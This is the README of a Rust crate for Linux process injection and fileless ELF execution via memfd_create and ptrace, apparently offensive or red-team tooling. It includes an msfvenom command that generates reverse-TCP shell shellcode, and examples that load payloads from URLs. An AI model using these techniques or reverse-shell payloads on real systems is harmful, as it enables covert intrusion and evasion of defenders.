# libinject-linux

`libinject-linux` is a Rust crate containing implementations for process injection and fileless ELF execution techniques on Linux.

## Functionality
The following techniques are currently implemented:
- Using [memfd_create(2)](https://man7.org/linux/man-pages/man2/memfd_create.2.html) to create an anonymous file in memory, write an ELF to it, and then execute.
- Using [ptrace(2)](https://man7.org/linux/man-pages/man2/ptrace.2.html) to stop a forked process, overwrite its RIP register with shellcode, and then resume it.

## Usage
### Library
Add `libinject-linux` as a dependency to your Rust project
```bash
cargo add --git https://github.com/dustyw0lf/libinject-linux.git
```

### Library examples
>[!note]
>The examples can take binaries or shellcode from either URLs or filesystem paths.

Clone the repo
```bash
git clone https://github.com/dustyw0lf/libinject-linux.git
```

Run the `memfd` example
```bash
cargo run --example memfd
```

To run the `hollow` example, first `cd libinject-linux/libinject/examples` and then
```bash
cargo run --example hollow
```

The example shellcode was generated using the following command
```bash
msfvenom --payload 'linux/x64/shell_reverse_tcp' LHOST=127.0.0.1 LPORT=1234 --format 'raw' --platform 'linux' --arch 'x64' --out shellcode.bin
```

### Standalone Binary
TODO: Write docs for standalone binary.